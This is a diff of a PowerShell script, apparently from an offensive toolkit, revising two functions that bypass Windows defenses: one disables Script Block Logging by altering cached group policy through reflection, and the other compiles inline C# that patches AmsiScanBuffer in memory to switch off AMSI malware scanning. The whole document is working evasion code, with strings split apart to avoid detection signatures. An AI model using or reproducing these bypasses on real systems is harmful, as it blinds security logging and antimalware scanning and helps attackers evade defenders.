@@ -1,6 +1,6 @@
 function Invoke-BypassScriptBlockLog {
     # cobbr's Script Block Logging bypass
-    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings','N'+'onPublic,Static');
+    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
     If($GPF){
         $GPC=$GPF.GetValue($null);
         If($GPC['ScriptB'+'lockLogging']){
@@ -12,7 +12,7 @@ function Invoke-BypassScriptBlockLog {
         $val.Add('EnableScriptBlockInvocationLogging',0);
         $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
     } Else {
-        [ScriptBlock].\"GetFie`ld\"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+        [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
     }
 }
 
@@ -31,46 +31,46 @@ function Invoke-BypassAMSI2 {
     );
 
     $Source = @"
-    using System;
-    using System.Runtime.InteropServices;
+using System;
+using System.Runtime.InteropServices;
 
-    namespace Bypass
+namespace Bypass
+{
+    public class AMSI$id
     {
-        public class AMSI$id
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+        public static int Disable()
         {
-            [DllImport("kernel32")]
-            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-            [DllImport("kernel32")]
-            public static extern IntPtr LoadLibrary(string name);
-            [DllImport("kernel32")]
-            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            if (TargetDLL == IntPtr.Zero) { return 1; }
 
-            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-            static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+            if (ASBPtr == IntPtr.Zero) { return 1; }
 
-            public static int Disable()
-            {
-                IntPtr TargetDLL = LoadLibrary("amsi.dll");
-                if (TargetDLL == IntPtr.Zero) { return 1; }
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
 
-                IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
-                if (ASBPtr == IntPtr.Zero) { return 1; }
+            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
 
-                UIntPtr dwSize = (UIntPtr)5;
-                uint Zero = 0;
+            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
+            MoveMemory(ASBPtr, unmanagedPointer, 6);
 
-                if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
-
-                Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-                IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
-                Marshal.Copy(Patch, 0, unmanagedPointer, 6);
-                MoveMemory(ASBPtr, unmanagedPointer, 6);
-
-                return 0;
-            }
+            return 0;
         }
     }
-    "@;
+}
+"@;
 
     Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
     iex "[Bypass.AMSI$id]::Disable() | Out-Null"
